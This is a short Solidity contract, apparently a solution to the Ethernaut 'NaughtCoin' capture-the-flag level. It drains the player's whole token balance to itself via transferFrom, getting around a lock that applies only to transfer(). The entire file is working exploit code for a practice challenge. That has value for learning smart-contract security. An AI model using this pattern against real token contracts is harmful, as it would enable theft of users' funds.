// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface INaughtCoin {
    function player() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract NaughtCoinHack {
    function attack(IERC20 naughtCoinAddress) external {
        address player = INaughtCoin(address(naughtCoinAddress)).player();
        uint256 bal = naughtCoinAddress.balanceOf(player);
        naughtCoinAddress.transferFrom(player, address(this), bal);
    }
}